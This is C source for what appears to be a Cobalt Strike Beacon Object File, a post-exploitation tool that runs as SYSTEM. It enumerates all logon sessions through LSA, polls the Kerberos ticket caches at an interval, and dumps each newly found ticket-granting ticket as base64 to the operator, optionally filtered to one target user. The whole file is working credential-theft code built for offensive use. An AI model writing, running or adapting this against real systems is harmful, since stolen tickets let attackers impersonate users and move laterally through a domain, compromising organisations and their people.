#include <windows.h>
#include "beacon.h"
#include "common.h"

NTSTATUS GetLsaHandle(HANDLE* hLsa) {
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hLsaLocal = NULL;
    LSA_OPERATIONAL_MODE mode = 0;
    
    LSA_STRING lsaString = { .Buffer = "Winlogon", .Length = 8, .MaximumLength = 9 };
    status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaRegisterLogonProcess failed.\n");
        return status;
    }
    
    *hLsa = hLsaLocal;
    return STATUS_SUCCESS;
}

NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING target, PUCHAR* ticket, PULONG ticketSize) {
    NTSTATUS status = STATUS_SUCCESS;
    NTSTATUS protocolStatus = STATUS_SUCCESS;
    KERB_RETRIEVE_TKT_REQUEST* request = NULL;
    KERB_RETRIEVE_TKT_RESPONSE* response = NULL;
    ULONG requestSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + target.MaximumLength;
    ULONG responseSize = 0;

    request = (KERB_RETRIEVE_TKT_REQUEST*)MemAlloc(requestSize);
    if (!request)
        return STATUS_MEMORY_NOT_ALLOCATED;

    request->MessageType = KerbRetrieveEncodedTicketMessage;
    request->LogonId = luid;
    request->TicketFlags = 0;
    request->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    request->EncryptionType = 0;
    request->TargetName = target;
    request->TargetName.Buffer = (PWSTR)((PBYTE)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    MSVCRT$memcpy(request->TargetName.Buffer, target.Buffer, target.MaximumLength);

    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, (PVOID*)&response, &responseSize, &protocolStatus);
    MemFree(request);

    if (!NT_SUCCESS(status) || !NT_SUCCESS(protocolStatus) || responseSize == 0) {
        if (response) SECUR32$LsaFreeReturnBuffer(response);
        return NT_SUCCESS(status) ? protocolStatus : status;
    }

    *ticketSize = response->Ticket.EncodedTicketSize;
    *ticket = (PUCHAR)MemAlloc(*ticketSize);
    if (!*ticket) {
        SECUR32$LsaFreeReturnBuffer(response);
        return STATUS_MEMORY_NOT_ALLOCATED;
    }

    MSVCRT$memcpy(*ticket, response->Ticket.EncodedTicket, *ticketSize);
    SECUR32$LsaFreeReturnBuffer(response);
    return STATUS_SUCCESS;
}

NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTICKET_CACHE cache) {
    NTSTATUS status = STATUS_SUCCESS;
    ULONG sessionCount   = 0;
    PLUID sessionList    = NULL;
    cache->tickets = NULL;
    cache->count   = 0;

    // Enumerate all current logon sessions
    status = SECUR32$LsaEnumerateLogonSessions(&sessionCount, &sessionList);
    if (!NT_SUCCESS(status))
        return status;
    
    cache->tickets = (PTICKET_ENTRY)MemAlloc(sessionCount * 64 * sizeof(TICKET_ENTRY));
    if (!cache->tickets) {
        SECUR32$LsaFreeReturnBuffer(sessionList);
        return STATUS_MEMORY_NOT_ALLOCATED;
    }
    
    // Get data for each logon session
    for (ULONG i = 0; i < sessionCount; i++) {
        PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
        status = SECUR32$LsaGetLogonSessionData(&sessionList[i], &sessionData);
        if (!NT_SUCCESS(status) || !sessionData)
            continue;

        // Check if a target user has been set
        if (targetUser && targetUser[0] != '\0') {
            char username[256] = { 0 };
            if (sessionData->UserName.Buffer && sessionData->UserName.Length > 0)
                KERNEL32$WideCharToMultiByte(CP_ACP, 0, sessionData->UserName.Buffer, sessionData->UserName.Length / 2, username, sizeof(username), NULL, NULL);

            // Case-insensitive name comparison
            if (MSVCRT$_stricmp(username, targetUser) != 0) {
                SECUR32$LsaFreeReturnBuffer(sessionData);
                continue;
            }
        }
            
        KERB_QUERY_TKT_CACHE_REQUEST request = { .MessageType = KerbQueryTicketCacheExMessage, .LogonId = sessionData->LogonId };
        SECUR32$LsaFreeReturnBuffer(sessionData);

        KERB_QUERY_TKT_CACHE_EX_RESPONSE* response = NULL;
        ULONG responseSize = 0;
        NTSTATUS protoStatus  = 0;

        // Query LSA to retrieve ticket cache information
        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &request, sizeof(request), (PVOID*)&response, &responseSize, &protoStatus);
        if (!NT_SUCCESS(status) || !response)
            continue;

        // Iterate through result to find TGTs
        for (ULONG j = 0; j < response->CountOfTickets; j++) {
            KERB_TICKET_CACHE_INFO_EX* t = &response->Tickets[j];

            // Skip service tickets by filtering for SPNs that start with "krbtgt/"
            if (MSVCRT$wcsncmp(t->ServerName.Buffer, L"krbtgt/", 7) != 0)
                continue;

            // Create TGT entry
            PTICKET_ENTRY entry = &cache->tickets[cache->count++];
            entry->luid           = sessionList[i];
            entry->startTime      = t->StartTime;
            entry->endTime        = t->EndTime;
            entry->renewTime      = t->RenewTime;
            entry->ticketFlags    = t->TicketFlags;
            entry->encryptionType = t->EncryptionType;
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ServerName.Buffer, t->ServerName.Length / 2, entry->spn,         sizeof(entry->spn),         NULL, NULL);
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ClientName.Buffer, t->ClientName.Length / 2, entry->clientName,  sizeof(entry->clientName),  NULL, NULL);
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ClientRealm.Buffer, t->ClientRealm.Length / 2, entry->clientRealm, sizeof(entry->clientRealm), NULL, NULL);
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, t->ServerRealm.Buffer, t->ServerRealm.Length / 2, entry->serverRealm, sizeof(entry->serverRealm), NULL, NULL);
            break; 
        }
        SECUR32$LsaFreeReturnBuffer(response);
    }

    SECUR32$LsaFreeReturnBuffer(sessionList);
    return STATUS_SUCCESS;
}

/* 
    Displaying Ticket Information
*/
VOID PrintTime(LARGE_INTEGER* li) {
    LARGE_INTEGER localTime = { 0 };
    TIME_FIELDS tf = { 0 };
    NTDLL$RtlSystemTimeToLocalTime(li, &localTime);
    NTDLL$RtlTimeToTimeFields(&localTime, &tf);
    BeaconPrintf(CALLBACK_OUTPUT, "%d-%d-%d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
}

static const FLAG_ENTRY kerbFlags[] = {
    { reserved,          "reserved"           },
    { forwardable,       "forwardable"        },
    { forwarded,         "forwarded"          },
    { proxiable,         "proxiable"          },
    { proxy,             "proxy"              },
    { may_postdate,      "may_postdate"       },
    { postdated,         "postdated"          },
    { invalid,           "invalid"            },
    { renewable,         "renewable"          },
    { initial,           "initial"            },
    { pre_authent,       "pre_authent"        },
    { hw_authent,        "hw_authent"         },
    { ok_as_delegate,    "ok_as_delegate"     },
    { anonymous,         "anonymous"          },
    { name_canonicalize, "name_canonicalize"  },
    { enc_pa_rep,        "enc_pa_rep"         },
    { reserved1,         "reserved1"          },
};

VOID PrintTicketInformation(PTICKET_ENTRY entry) {
    // Header
    SYSTEMTIME now;
    KERNEL32$GetLocalTime(&now);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d-%d-%d %02d:%02d:%02d - Found new TGT:\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond);
    
    // Ticket information
    char user[512] = { 0 };
    MSVCRT$_snprintf(user, sizeof(user) - 1, "%s @ %s", entry->clientName, entry->clientRealm);
    BeaconPrintf(CALLBACK_OUTPUT, "  User           :  %s\n", user);
    BeaconPrintf(CALLBACK_OUTPUT, "  LogonId        :  0x%lx\n", entry->luid.LowPart);
    BeaconPrintf(CALLBACK_OUTPUT, "  StartTime      :  "); PrintTime(&entry->startTime); BeaconPrintf(CALLBACK_OUTPUT, "\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  EndTime        :  "); PrintTime(&entry->endTime);   BeaconPrintf(CALLBACK_OUTPUT, "\n");
    BeaconPrintf(CALLBACK_OUTPUT, "  RenewTill      :  "); PrintTime(&entry->renewTime); BeaconPrintf(CALLBACK_OUTPUT, "\n");

    // Flags
    UINT flags = entry->ticketFlags;
    BOOL first = TRUE;
    BeaconPrintf(CALLBACK_OUTPUT, "  Flags          :  ");
    for (int k = 0; k < sizeof(kerbFlags) / sizeof(kerbFlags[0]); k++) {
        if (flags & kerbFlags[k].mask) {
            BeaconPrintf(CALLBACK_OUTPUT, first ? "%s" : ", %s", kerbFlags[k].name);
            first = FALSE;
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n  Encoded Ticket :  ");
}

VOID PrintTicket(PBYTE ticket, ULONG ticketSize) {
    const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    ULONG b64Len = ((ticketSize + 2) / 3) * 4 + 1;
    char* b64 = MemAlloc(b64Len); 
    if (!b64) return;

    ULONG i = 0, j = 0;
    while (i < ticketSize) {
        ULONG rem  = ticketSize - i;
        BYTE  b0   = ticket[i++];
        BYTE  b1   = rem > 1 ? ticket[i++] : 0;
        BYTE  b2   = rem > 2 ? ticket[i++] : 0;
        b64[j++] = b64chars[b0 >> 2];
        b64[j++] = b64chars[((b0 & 3) << 4) | (b1 >> 4)];
        b64[j++] = rem > 1 ? b64chars[((b1 & 0xF) << 2) | (b2 >> 6)] : '=';
        b64[j++] = rem > 2 ? b64chars[b2 & 0x3F] : '=';
    }
    b64[j] = '\0';
    
    if(b64){
        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", b64); 
        MemFree(b64); 
    }
}

VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CACHE curr) {
    BOOL cacheUpdated = FALSE; 
    
    // Compare ticket caches to identify new TGTs
    for (int i = 0; i < curr->count; i++) {
        PTICKET_ENTRY currEntry = &curr->tickets[i];
        BOOL found = FALSE;
        for (int j = 0; j < prev->count; j++) {
            PTICKET_ENTRY prevEntry = &prev->tickets[j];
            if (
                currEntry->luid.LowPart == prevEntry->luid.LowPart  &&
                currEntry->luid.HighPart == prevEntry->luid.HighPart  &&
                MSVCRT$strcmp(currEntry->spn, prevEntry->spn) == 0
            ){
                found = TRUE;
                break;
            }
        }

        // Print new TGT
        if (!found) {
            WCHAR wspn[256] = { 0 };
            toWideChar(currEntry->spn, wspn, sizeof(wspn));
            UNICODE_STRING target = {
                .Buffer = wspn,
                .Length = (USHORT)(MSVCRT$wcslen(wspn) * 2),
                .MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2)
            };
            
            PrintTicketInformation(currEntry);
            
            PBYTE ticket = NULL;
            ULONG ticketSize = 0;
            if (NT_SUCCESS(ExtractTicket(hLsa, authPackage, currEntry->luid, target, &ticket, &ticketSize)) && ticket && ticketSize) {
                PrintTicket(ticket, ticketSize);
                MemFree(ticket);
            }
            cacheUpdated = TRUE;
        }
    }
    if (cacheUpdated){
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Ticket cache size: %d\n", curr->count);
        BeaconWakeup(); 
    }
}

VOID go(char* args, int argc) {
    
    datap parser = { 0 };
    HANDLE hStop = BeaconGetStopJobEvent();
        
    BeaconDataParse(&parser, args, argc);
    int interval = BeaconDataInt(&parser);
    char* targetUser = BeaconDataExtract(&parser, NULL);
        
    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Must be run as NT AUTHORITY\\SYSTEM.\n");
        return;
    }
    
    HANDLE hLsa = 0;
    if (!NT_SUCCESS(GetLsaHandle(&hLsa)))
        return;
    
    ULONG authPackage = 0;
    LSA_STRING krbAuth = { .Buffer = "kerberos", .Length = 8, .MaximumLength = 9 };
    if (!NT_SUCCESS(SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage))) {
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting TGT monitor (interval: %ds)\n", interval);
    if (targetUser && targetUser[0] != '\0')
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Target user: %s\n", targetUser);
    BeaconWakeup(); 

    TICKET_CACHE prev = { 0 };
    TICKET_CACHE curr = { 0 };
    
    do {

        // Periodically check for new TGTs
        if (NT_SUCCESS(EnumerateTickets(hLsa, authPackage, targetUser, &curr))) {
            RefreshCache(hLsa, authPackage, &prev, &curr);
            if (prev.tickets)
                MemFree(prev.tickets);
            prev = curr;
            curr = (TICKET_CACHE){ 0 };
        }

        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, interval * 1000, FALSE);
        if (wait == WAIT_OBJECT_0)
            break;
        if (wait != WAIT_TIMEOUT)
            break;

    } while (TRUE);

    if (prev.tickets)
        MemFree(prev.tickets);
    if (curr.tickets)
        MemFree(curr.tickets);

    SECUR32$LsaDeregisterLogonProcess(hLsa);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] BOF execution completed.\n");
}